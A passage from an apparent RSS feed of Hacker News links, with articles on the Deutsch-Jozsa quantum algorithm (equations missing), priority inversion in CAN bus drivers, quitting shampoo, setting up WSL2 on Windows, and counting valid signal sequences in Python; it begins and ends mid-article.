<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 1$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 1$.</p>



<p>Based on the reducing sum or difference to boolean property we derived above,</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>Taken together, for $n = k$,</p>



<p>where $i, j \in [0, 2^k)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k}$.</p>



<p>This finishes the mathematical induction and concludes the proof.</p>



<p>Note that the entries of the first column and the entries of the first row of $H^{\otimes {n}}$ have exactly the same value, $\frac{1}{\sqrt{2^{n}}}$. This is because</p>





<p>Equivalently, we might write, $H^{\otimes {n}}_{0,:} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$ and $H^{\otimes {n}}_{:,0} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$.</p>



<p>To extract an arbitrary column $j$ from $H^{\otimes {n}}$, we prepared a one-hot quantum system basic state vector $| \mathbf{y} \rangle = [y_0, y_1, \cdots, y_{2^n-1}]^{\top}$, where $y_j = 1$ and $y_k = 0$ for $k \neq j$.</p>



<p>where $| \mathbf{x}_i \rangle$ is a quantum system one-hot basic state vector,  $|\mathbf{x}_i\rangle = [x_0, x_1, \cdots, x_{2^{n}-1}]^{\top}$, where $x_i = 1$ and $x_k = 0$ for $k \neq i$.</p>



<p>Since $H^{\otimes {n}}$ is unitary and $(H^{\otimes {n}})^{-1} = H^{\otimes {n}}$as we have discussed above,</p>



<p>For example, if $j = 0$, $| \mathbf{y} \rangle = [\underbrace{1, 0, 0, \cdots, 0}_{2^n} ]^{\top} = | \mathbf{0} \rangle$,</p>



<h3 id="deutsch-jozsa-algorithm">Deutsch-Jozsa Algorithm</h3>

<p>The black-box $f(\mathbf{x})$ is represented using a quantum gate $U_f$. Our job is to determine whether the $f(\mathbf{x})$ corresponding to the $U_f$ is constant or balanced.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-07-03-Deutsch-Jozsa-Algorithm/Uf.png">
    <figcaption>$U_f$</figcaption>
</figure>
</div>

<p>The quantum gate $U_f$ is a unitary matrix which maps from $| \mathbf{x} \rangle \otimes | y \rangle$ to $| \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, namely $U_f (| \mathbf{x} \rangle \otimes | y \rangle) = | \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, for $x \in \{0, 1\}^n$ and $y \in \{0, 1\}$. When $y = 0$, $| f(\mathbf{x}) \oplus y \rangle = | f(\mathbf{x}) \oplus 0 \rangle = | f(\mathbf{x}) \rangle $, $| y \oplus f(\mathbf{x}) \rangle$ is just $| f(\mathbf{x}) \rangle$.</p>



<p>Note that the above mapping is only necessarily valid when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions.</p>



<p>Let’s further check when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions, what the outputs from $U_f$ will be. Perhaps we could achieve fewer runs with superpositions.</p>

<h4 id="first-attempt">First Attempt</h4>

<p>In the first attempt, we made the second input to $U_f$ a superposition, which is achieved by applying a Hadamard operator to the second input $|1\rangle$. This is almost the same as what we did in the second attempt in the <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a>. The superposition is</p>



<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-07-03-Deutsch-Jozsa-Algorithm/attempt-1.png">
    <figcaption>First Attempt</figcaption>
</figure>
</div>







<p>Because $\frac{|f(\mathbf{x})\rangle - |\overline{f(\mathbf{x})}\rangle}{\sqrt{2}}$ is either $\frac{|0\rangle - |1\rangle}{\sqrt{2}}$ or $\frac{|1\rangle - |0\rangle}{\sqrt{2}}$, $|\varphi_2\rangle $ could be further simplified as</p>



<p>The observation from the first output is always the same to the first input, whereas there …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/">https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734517</guid>
            <pubDate>Sat, 04 Jul 2020 19:56:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Priority inversion in the automotive CAN protocol]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734394">thread link</a>) | @leoc
<br/>
July 4, 2020 | https://kentindell.github.io/2020/06/29/can-priority-inversion/ | <a href="https://web.archive.org/web/*/https://kentindell.github.io/2020/06/29/can-priority-inversion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The problem of <strong>priority inversion</strong> is well-known and.. actually, scratch that: it’s clearly not well known at all because people keep making the
same mistake. So I’m writing this to try and explain the problem (with reference to CAN) in the hope that a search engine indexes this and puts
it high enough up the search results for people to find.</p>

<p>The TL;DR for priority inversion:</p>

<blockquote>
  <p>Priority inversion causes a high priority activity to get delayed for a long time, causing missed deadlines, timeouts, and all kinds of
consequent faults. Worse, it’s typically an intermittent problem often not found in testing, and a great source of Heisenbugs because adding
instrumentation to look at it can make it go away.
It happens when the high priority (and urgent) activity gets stuck behind a low priority (non-urgent) activity and
lots of medium priority activities block the low priority activity, which is blocking the high priority activity.</p>
</blockquote>

<p>The word ‘activity’ here can mean tasks in a real-time system, scheduled by an RTOS (real-time operating system) that chooses what to run
based on priorities.  This is exactly what happened on Mars on the 4th July 1997 when the Mars Pathfinder mission landed.</p>

<p><img src="https://kentindell.github.io/assets/384_pathfinder.jpg" alt="Mars Pathfinder"></p>

<p>The spacecraft control system kept going through watchdog resets, triggered because
a high priority task didn’t complete in time. The problem was down to priority inversion around access to a resource guarded by a semaphore. A low
priority task had the resource locked, and the high priority task was blocked waiting for the low priority task to release the semaphore.
But the low priority task couldn’t run because medium
priority tasks were running, so it couldn’t unlock the semaphore, and so the high priority task got stuck, the watchdog triggered, the system reset,
and the process repeated. You can read more about it directly from the
<a href="https://www.cs.unc.edu/~anderson/teach/comp790/papers/mars_pathfinder_long_version.html">horse’s mouth</a>
(Glenn Reeves, the NASA team lead for the Pathfinder spacecraft software).</p>

<p>Priority inversion also happens in CAN. The CAN protocol uses priorities (in the form of CAN IDs) to determine which frame is transmitted on the bus.
But the CAN specification says nothing about how frames <em>within</em> a CAN controller are arbitrated. What <em>should</em> happen is that frames are internally
arbitrated by priority, so that the frame the CAN engine enters into bus arbitration is the highest of its own frames, and then the CAN bus arbitration
picks the highest priority frame bus-wide. But if a FIFO queue is used internally then we get priority
inversion.</p>

<p>Here’s a short video showing how priority inversion plays out on CAN bus:</p>

<p>
  <iframe src="https://www.youtube.com/embed/0xkZ8glPSXA" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>I’ve put together a demo using real CAN hardware to show how this really 
happens in a CAN system. The demo uses
<a href="https://store.micropython.org/">PyBoards</a> - small boards based on the
STM32F405 microcontroller with on-chip CAN controllers (ST’s bxCAN controller)
and running <a href="https://http//micropython.org/">MicroPython</a> firmware with
custom CAN drivers that I wrote.</p>

<p><img src="https://kentindell.github.io/assets/demo-boards.png" alt="Demo boards"></p>

<p>The PyBoards fit into a custom rack cards that <a href="https://canislabs.com/">Canis Labs</a> uses
to test CAN-HG (CAN-HG is an augmentation of CAN that adds out-of-band data for security
and performance, but that’s another story..)
The <a href="https://www.kvaser.com/products-services/our-products">Kvaser Leaf</a> and
<a href="https://rbei-etas.github.io/busmaster/">Busmaster</a> tools
are used to see the CAN frames on the bus. The video below shows how
priority inversion happens for real, and also how it’s fixed with priority
queueing in the CAN drivers.</p>

<p>
  <iframe src="https://www.youtube.com/embed/QjzB2Tgz8qg" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>Priority inversion on CAN is not a theoretical or contrived problem. To see this, let’s take a look at
the <a href="https://zephyrproject.org/">Zephyr Project</a> CAN system.
The <a href="https://docs.zephyrproject.org/latest/reference/networking/can_api.html">CAN API</a> is very simple, with just a <code>can_send</code> call to queue a CAN frame
(a callback can be set for a “sent” event). There’s nothing inherently wrong with this API. If the number of buffer slots supports is small then there is
pressure on the application developer to create their own queue in software, and inevitably this will be a FIFO queue (I’ll come back to this shortly).
The problem is deeper in the drivers. Here is a code snippet from the
code for the <a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_stm32.c">STM32 CAN controller driver</a>:</p>

<div><div><pre><code>	/* Set TX priority to chronological order */
	can-&gt;MCR |= CAN_MCR_TXFP;
</code></pre></div></div>

<p>The bit <code>TXFP</code> is described in the STM32 reference manual for the bxCAN CAN controller as follows:</p>

<blockquote>
  <p>“The transmit mailboxes can be configured as a transmit FIFO by setting the <code>TXFP</code> bit in the <code>CAN_MCR</code> register. In this mode the priority order is
given by the transmit request order. This mode is very useful for segmented transmission.</p>
</blockquote>

<p>Yep, we have a priority inversion problem with these drivers. Let’s look at the <code>can_send</code> function in the
<a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_mcux_flexcan.c">NXP FlexCAN drivers</a>:</p>

<div><div><pre><code>	while (true) {
		alloc = mcux_get_tx_alloc(data);
		if (alloc &gt;= 0) {
			if (atomic_test_and_set_bit(data-&gt;tx_allocs, alloc)) {
				continue;
			}

			break;
		}

		if (k_sem_take(&amp;data-&gt;tx_allocs_sem, timeout) != 0) {
			return CAN_TIMEOUT;
		}
	}
</code></pre></div></div>

<p>The NXP FlexCAN controller is a slotted buffer controller, which means it has lots of CAN frame buffer slots in its memory, allocated between sending
and receiving CAN frames.  The controller can be set to arbitrate between its frames by buffer number or by CAN ID. The driver selects arbitration by 
buffer number and then in the <code>can_send</code> function they allocate a buffer higher than any buffer in use, in order to preserve FIFO transmission order:</p>

<div><div><pre><code>	/* mcux_get_tx_alloc is a linear on array, and binary on atomic_val_t search
	 * for the highest bit set in data-&gt;tx_allocs. 0 is returned in case of an empty
	 * tx_alloc, the next free bit otherwise.
	 * The reason to always use a higher buffer number than the current in use is
	 * that a FIFO manner is kept. The Controller would otherwise send the frame
	 * that is in the lowest buffer number first.
	 */
</code></pre></div></div>

<p>So this driver specifically implement FIFO buffering, which is bad enough, but worse than that is that it spins waiting for a free buffer,
where “free” doesn’t mean buffer without a CAN frame in it, but one where the buffer number is
higher than any frame in the controller. What will tend to happen under peak bus load is that the buffer number will ‘walk’ up to the top one,
and then when that buffer contains a
low priority frame, the task will spin on a sequence of CAN transmit events for ages waiting for it to be put into the controller (this could be tens or
hundreds of milliseconds on a busy CAN bus).
In essence, this couples priority inversion on the CAN bus to task execution, causing a task
to overrun and fail in unpredictable ways. And it’s an intermittent problem that probably won’t appear in testing. Obviously this is a terrible driver design.</p>

<p>It may look like I am picking on the Zephyr Project, but far from it: I’ve come across it in many other CAN drivers too, <strong>even in a self-driving
car system</strong> where the steering depended on sending a CAN frame with a short latency!</p>

<p>So how is priority inversion solved? What is required to solve it? In short, the CAN frame queueing in the CAN driver must be by CAN ID value, using the same
ordering as on the CAN bus. For CAN controllers that support a large number of messages then this is usually as simple as flipping a bit to ask the controller
to arbitrate internally this way (the FlexCAN and the bxCAN controllers by default come out of reset in this mode!).</p>

<p>For CAN controllers with only three
buffers then the software drivers must keep a bigger priority queue in memory and then shuffle the frames back and forth to keep the highest priority three
frames in the hardware. All these controllers provide an an abort mechanism so that a low priority CAN frame in a hardware buffer can be thrown out and
replaced by a new higher priority frame. The CAN controllers are generally designed to help with this: the bxCAN has a <code>CODE</code> field and the FlexCAN
has a <code>LPTM</code> field to indicate which of the transmit buffers is the lowest-priority one.</p>

<p>Note that the common Microchip MCP2515 standalone CAN controller has three transmit buffers, but it doesn’t arbitrate internally by CAN ID (there is a
2-bit priority field for each buffer, but this won’t work because the priorities would need to be atomically re-ordered when a new
frame is put in the controller). It’s simpler to just use a single buffer and use the abort mechanism when a low-priority frame needs to 
be pre-empted.</p>

<p>One final point worth discussing is why people are so attracted to FIFO queueing of CAN frames (even to the point of disabling the default priority queueing
in CAN controllers)? One answer to this is <em>segmented messages</em>: quite a few CAN layers define ways to map a message longer than 8 bytes into a
sequence of 8-byte CAN
frames, and this nearly always is done by transmitting a sequence of CAN frames with the same ID. It’s obviously vital that these
frames go into FIFO order because otherwise the bigger message is scrambled. The problem with queueing by CAN priority is that
under nearly all priority queueing implementations (both hardware and software), two internal frames with the same ID are entered into arbiration in an
undefined transmission order (for example, the FlexCAN hardware uses an internal hardware scanning state machine that loops around all the buffers
looking for the lowest priority frame). The solution to this
is not, of course, to make all CAN frames go in FIFO order, but to make only frames for a segmented message go in FIFO order <em>with respect to each other</em>. This
is actually straightforward to implement using a higher-level FIFO driver, that creates a FIFO queue of frames and then hands them to the CAN driver 
one-by-one as each previous frame is sent.</p>

<p>So to summarise:</p>

<ul>
  <li>Priority inversion is a big deal, it’s an intermittent problem that might escape testing but could be catastrophic when deployed</li>
  <li>Priority inversion happens on CAN</li>
  <li>It is fixed by having the hardware arbitrate internally by CAN ID</li>
  <li>If there aren’t enough buffers in hardware then the driver should implement them in software using the abort feature of the CAN hardware and not just push the problem up to the application (which will inevitably just use a FIFO queue)</li>
  <li>Where FIFO sending is important (e.g. segmented messaging) it …</li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kentindell.github.io/2020/06/29/can-priority-inversion/">https://kentindell.github.io/2020/06/29/can-priority-inversion/</a></em></p>]]>
            </description>
            <link>https://kentindell.github.io/2020/06/29/can-priority-inversion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734394</guid>
            <pubDate>Sat, 04 Jul 2020 19:35:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No More Shampoo]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23734392">thread link</a>) | @riverlong
<br/>
July 4, 2020 | https://jayriverlong.github.io/2020/07/04/shampoo.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/07/04/shampoo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>In December 2019, my girlfriend mentioned that my hair smelled unusually good. What was I doing differently? Nothing, I thought. Everything was just as always. Except that I had run out of shampoo a few weeks prior, and hadn’t noticed until then.</p> <p>As a teen, I used plenty of hair products. Gels were cool in the early 2000s, and sculpting wax remained in vogue even afterwards. Such products require washing out at the end of the day, otherwise it feels gross, and (ironically) would make your hair unwieldy afterwards. By the time I got to college, I was used to shampooing my hair most days.</p> <p>However, my college roommate suffered from severe male pattern balding as he hit his early 20s, and he made that suffering a core piece of his identity. Fear is contagious, so I quit hair products, and began to exclusively use the most scalp-friendly shampoo I could find, <a href="https://www.kiehls.com/hair/shampoos/amino-acid-shampoo/247.html">Kiehl’s Amino Acid Shampoo</a>. I reduced my shampooing to twice a week, and was careful not to use too much.<sup id="fnref:1"><a href="#fn:1">1</a></sup> My hair was fine and usually short, so that was perfectly sufficient for the most part of the last decade.</p> <p>That was until I ran out in mid-November 2019. I hadn’t even noticed, and my girlfriend had complimented me on my hair, so I thought I might as well keep going. I had previously read about the <a href="https://www.reddit.com/r/NoPoo/">NoPoo Movement</a> – people washing their hair with stuff like olive oil or quitting shampoo altogether – and that had been intriguing. Ever since I tried anti-dandruff shampoo and it immediately gave me dandruff, I had a hunch that shampoo might just be a scam. I was ready to give NoPoo a try.</p> <p>Seven or eight months later, I still haven’t used shampoo or conditioner once. I rinse it with warm water every morning when I shower, give it a quick rub with a towel, brush it, and I’m off to the races.</p> <p>The results are fantastic. My hair is silky smooth, looks and feels clean, and a slight build-up of natural oils makes it easy to form. If I run my hand through my hair to push it back, it stays (mostly) in place.</p> <p>Keeping my hair in place had been a real frustration with a frequent shampooing routine: my hair would be so light and dry that it was impossible to rule – I would <em>have</em> to use a product to keep it from dangling into my forehead, or I’d have to get haircuts to specifically trim the unruly parts that would stick out. Reducing shampoo – and eventually eliminating it – made it possible to actually get somewhere combing it.</p> <p>During this time – thanks to COVID-19 – I haven’t had a haircut, so my hair is now also longer than usual. (I feel like a stand-in from an ’80s movie.) It’s easy to go NoPoo when you have short hair, because there’s ultimately little hair to accumulate lots of grease and oil. The threat of greasy hair is more severe when your hair is longer, which is why I suspect it’s mostly men<sup id="fnref:2"><a href="#fn:2">2</a></sup> who opt to abandon shampoo. For me, it ended up fine.</p> <p>Abandoning shampoo works because it restores the natural balance of oils on your scalp. Most shampoos are effectively like dish soap: they aggressively remove grease from your head. That dries out your scalp, so – no surprise – you produce <em>more</em> oils to compensate. That makes your hair greasy in short order, so you then have to shampoo again. It’s even more extreme if you apply additional grease in form of hair products. Like a ketamine-cocaine bender, you are net balanced while swinging between extremes. That’s not great. Consequently, most people report that the toughest thing about abandoning shampoo is the first two or three weeks, while your hair becomes quite greasy as your scalp readjusts how much oil it needs to produce. I was fortunate that during that time, I had been too busy to notice.</p> <p>I hope to get a haircut soon as COVID wraps up, but I don’t see myself using shampoo again in the course of my everyday life. It might be worth making exceptions if I somehow get really dirty in nature or doing some DIY stuff,<sup id="fnref:3"><a href="#fn:3">3</a></sup> but for the most part it just seems unnecessary.</p> <hr>  <br> </article> </div></div>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/07/04/shampoo.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734392</guid>
            <pubDate>Sat, 04 Jul 2020 19:35:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Schema Inference for JSON Datasets (2017) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734293">thread link</a>) | @dvt
<br/>
July 4, 2020 | https://openproceedings.org/2017/conf/edbt/paper-62.pdf | <a href="https://web.archive.org/web/*/https://openproceedings.org/2017/conf/edbt/paper-62.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://openproceedings.org/2017/conf/edbt/paper-62.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734293</guid>
            <pubDate>Sat, 04 Jul 2020 19:16:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Setup Dev Env on Windowns with WSL2]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734203">thread link</a>) | @arkokoley
<br/>
July 4, 2020 | https://gaurav.koley.in/2020/setup-development-env-on-windows | <a href="https://web.archive.org/web/*/https://gaurav.koley.in/2020/setup-development-env-on-windows">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I had been living the "Windows free" life for almost 10 years even since I switched over to first <a href="https://www.linuxmint.com/">Linux Mint</a>, then <a href="https://ubuntu.com/">Ubuntu</a> and lately <a href="https://pop.system76.com/">Pop!_OS</a>. Over these years, I went to university, learnt programming and earned 2 degrees in Computer Science, all the while programming on Ubuntu/the CLI. </p>

<p>This changed in 2019 when I joined Microsoft as a Software Engineer and I had to familiarize myself with coding on Windows. Since then, I have worked on Windows for .NET, C# and several Nodejs projects but never did any heavy lifting like Python or Ruby on Rails. (If you are familiar with my blog, my personal projects revolve mostly around Ruby on Rails and VueJS.) </p>

<p>So when Microsoft announced WSL 2, I had to try it out! I've always wanted to play games on Windows as well code, but switching my entire workflow to Windows from Pop!_OS wasn't quite seamless as I wanted — so I was ready for an upgrade. </p>

<h3>Install WSL 2</h3>

<ul>
<li>Jump on the Windows Insider Program by joining in the Settings. You'll need to be on build 18917 or above, which means you can choose either the Dev or Beta channel — the latter of which is more stable.</li>
<li>Once you're up and running, <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">Install WSL 2 with the Linux flavor of your choice</a>.</li>
<li>Download and install the <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-kernel">Linux kernel update package</a>.</li>
<li>And done! To make the environment seamless, try out <a href="https://www.microsoft.com/en-us/p/windows-terminal-preview/9n0dx20hk701">Microsoft's new Terminal</a> to switch between your Linux installs on demand.</li>
</ul>

<h3>Install Docker</h3>

<p>Download and install <a href="https://hub.docker.com/editions/community/docker-ce-desktop-windows/">Docker Desktop Stable 2.3.0.2</a> or a later release. </p>

<p>After installation, on the Docker Deskop app, do the following steps:</p>

<ol>
<li>From the menu, select Settings &gt; General.</li>
<li><p>Select the Use WSL 2 based engine check box. If you are using Windows 10 Home, this will be checked by default.</p>

<p><img src="https://gaurav.koley.in/public/images/wsl_enable.png" alt="WSL Enable"></p>

<p>Optionally, select any additional distributions you would like to access docker from, by going to Resources &gt; WSL Integration.</p>

<p><img src="https://gaurav.koley.in/public/images/wsl_select.png" alt="WSL Select"></p></li>
<li><p>Click Apply &amp; Restart.</p></li>
</ol>

<p>Now you will be able to access docker and docker-compose within your WSL 2 installations too (and these work like native Ubuntu, so most of your existing docker and docker-compose scripts should work just fine). </p>

<p>Fire up Windows Terminal and from the dropdown at the top, you should be able to get a bash shell to your WSL distro. </p>

<p><img src="https://gaurav.koley.in/public/images/terminal.png" alt="Terminal"></p>

<p><em>Profit!</em></p>

<h3>Install VS Code with Remote WSL Extension</h3>

<p>If you don't use VS Code, now is the perfect time to give it a try. Pair it with the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-wsl">Remote WSL Extension</a> and from your terminal, launch into Visual Studio Code using <code>code .</code> from your WSL bash. You can even use <code>wsl code .</code> to switch to Linux inline from Command Prompt or Powershell, launch into VS Code, then return to your Windows shell. :D</p>

<p>Personally, I'm using WSL 2 for 100% of my development on Windows – all dev tools such as Git and Node.js are installed in my Linux environment. </p>

<p>Here's a look at me writing this post on WSL:</p>

<p><img src="https://gaurav.koley.in/public/images/vscode.png" alt="VS Code Setup"></p>

<p>In the screenshot, it is visible that I'm connected to my WSL 2 instance (see 'WSL:Ubuntu' in the bottom-left as the remote source). Also notice that my line endings are defaulted to LF (shown in the Status bar) without having to set any additional Git configuration options - if you're on Windows working in open source, you understand why this is a big deal. Also all my favorite extensions work and are targeting the correct environment. </p>

<p>With WSL 2, Windows has come a long way as a preferred programming platform and hopefully as the community matures, we would see more tightly integrated tools being ported from Linux to Windows. </p>

  </div></div>]]>
            </description>
            <link>https://gaurav.koley.in/2020/setup-development-env-on-windows</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734203</guid>
            <pubDate>Sat, 04 Jul 2020 19:02:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thinking about Algorithmic problems II]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734171">thread link</a>) | @codingifmycraft
<br/>
July 4, 2020 | http://codingismycraft.com/index.php/2020/07/03/thinking-about-algorithmic-problems-ii/ | <a href="https://web.archive.org/web/*/http://codingismycraft.com/index.php/2020/07/03/thinking-about-algorithmic-problems-ii/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1622">
	
		<div>
<figure>
<img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-9.png?resize=494%2C381" alt="" title="sig-9">
</figure>
<p>As we have seen in the <a href="http://codingismycraft.com/index.php/2020/07/02/thinking-about-algorithmic-problems/" target="_blank" rel="noopener">previous article</a> solving a programming problem that requires a custom algorithm can be broken in several steps which can be summarized in the creation of testing data, the implementation of a brutal force solution and the deeper study of the particular case which might reveal a <strong>smart trick</strong> to achieve an efficient solution.</p>
<p>In this posting we follow the same approach applied to a problem that seems hard but after some thinking becomes very obvious and easy to solve.</p>
<h2>The problem</h2>
<p>Lets assume that we have an electronic device that in one unit of time can send a request and receive a response from a server; the possible responses are as follows:</p>
<ul>
<li>S: Success</li>
<li>C: Corrupted data</li>
<li>F: Failure to connect</li>
</ul>
<p>Assuming 2 units of time the sequence our possible responses are as follows:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-1.gif?resize=282%2C135" alt="sig-1" data-recalc-dims="1"></p>
<p>The software that controls our device will automatically stop in any one of the&nbsp; following conditions:</p>
<ul>
<li>Received two Failures at any time</li>
<li>Received three consecutive corrupted data</li>
</ul>
<p>Based on this definition the sequence for 2 units of time the possible valid signals are 8 :</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-2.gif?resize=286%2C144" alt="sig-2" data-recalc-dims="1"></p>
<p>(Note that the FF sequence has been dropped)</p>
<p>To make our requirement cleaner assuming 3 units of time the sequence of valid signals (19) will be the following:<br>
<img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-3.png?resize=300%2C315" alt="sig-3" data-recalc-dims="1"></p>
<p>Note that the following 8 signals are dropped:<br>
<img src="http://i0.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-4.png?resize=290%2C139" alt="sig-4" data-recalc-dims="1"></p>

<p>Our problem is the following:</p>
<p><em><strong>For a given number of units of time calculate the count of all possible valid sequences of signals</strong></em></p>
<h2>The Brutal Solution</h2>
<p>At this point you should pause and re-read the definition of the problem and try to digest it.</p>
<p>We already have the following test data:</p>
<table>
<tbody>
<tr>
<th>Units of time</th>
<th>Number of sequences</th>
</tr>
<tr>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>2</td>
<td>8</td>
</tr>
<tr>
<td>3</td>
<td>19</td>
</tr>
</tbody>
</table>
<p>Simply be noticing that each new sequence multiplies the existing signals by a factor of 3 for each Success, Failure and Corrupted message received we can easily code a brutal force solution which for each new time unit creates the new sequences and drops those ending with three corruptions or containing two failures at any point. Using our test data our brutal solution looks like the following:</p>
<pre title="">def count_sequences_brutal(units_of_time):
    sequences = ['S', 'F', 'C']
    for i in range(1, units_of_time):
        new_sequences = []
        for sequence in sequences:
            for c in 'SFC':
                new_str = sequence + c
                if 'CCC' in new_str or new_str.count('F') &gt;= 2:
                    continue
                new_sequences.append(new_str)
        sequences = new_sequences
    return len(sequences)


assert count_sequences_brutal(1) == 3
assert count_sequences_brutal(2) == 8
assert count_sequences_brutal(3) == 19
</pre>
<p>Now that we have a correct solution in place lets try to see how efficient it is in terms of performance as the number of time units is increasing:</p>
<p>Running the following code:</p>
<pre title="">import timeit
import functools

for time_units in [2, 3, 6, 10, 20, 25]:
    print(
        'time_units:', time_units, 'duration:',
        timeit.timeit(stmt=functools.partial(count_sequences_brutal, time_units), number=1)
    )
</pre>
<p>We are getting the following output:</p>
<p><img src="http://i0.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-5.png?resize=537%2C178" alt="sig-5" data-recalc-dims="1"></p>
<p>Note how quickly the&nbsp; running time grows; for 10 unit times 0.006 seconds are required but for 25 we are reaching more than 89 seconds!</p>
<p>Obviously our brutal force algorithm is terrible in terms in performance as it big O complexity is exponential. It still can be helpful for us since we create the following testing data that we will use later to test our efficient algorithm:</p>
<table>
<tbody>
<tr>
<th>Units of time</th>
<th>Number of sequences</th>
</tr>
<tr>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>2</td>
<td>8</td>
</tr>
<tr>
<td>3</td>
<td>19</td>
</tr>
<tr>
<td>4</td>
<td>43</td>
</tr>
<tr>
<td>5</td>
<td>94</td>
</tr>
<tr>
<td>6</td>
<td>200</td>
</tr>
<tr>
<td>7</td>
<td>418</td>
</tr>
<tr>
<td>8</td>
<td>861</td>
</tr>
<tr>
<td>9</td>
<td>1753</td>
</tr>
<tr>
<td>10</td>
<td>3536</td>
</tr>
</tbody>
</table>
<h2>Analyzing the problem</h2>
<p>At this point we have enough data and understanding of our problem so we can analyze it further and try to discover some hidden tricks that might allow us to come up with a smart algorithm that will solve it efficiently.</p>
<p>Thinking about our problem we can see that all of the following statements are all correct about a valid sequence:</p>
<ul>
<li>Ends with one of the letters <strong>S</strong> <strong>F</strong> <strong>C</strong> or <strong>CC</strong></li>
<li>Contains none or a single failure <strong>F</strong></li>
<li>Does not contain a <strong>CCC</strong> sub-sequence</li>
</ul>
<p>Each iteration goes through all of the previous sequences and for each of them creates three new sequences appending the <strong>S</strong> <strong>F</strong> <strong>C</strong> to its end; as this happens some of them will be rejected as invalid due to the rules we have defined above as can be seen in this picture:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-7.gif?resize=617%2C239" alt="sig-7" data-recalc-dims="1"></p>
<p>Having said this, we can express the count of valid sequences at any point by adding up the following counters:</p>
<table>
<tbody>
<tr>
<th>Counter Name</th>
<th>Description</th>
</tr>
<tr>
<td><strong>FS</strong></td>
<td>exactly one <strong>F</strong>, ending with <strong>S</strong></td>
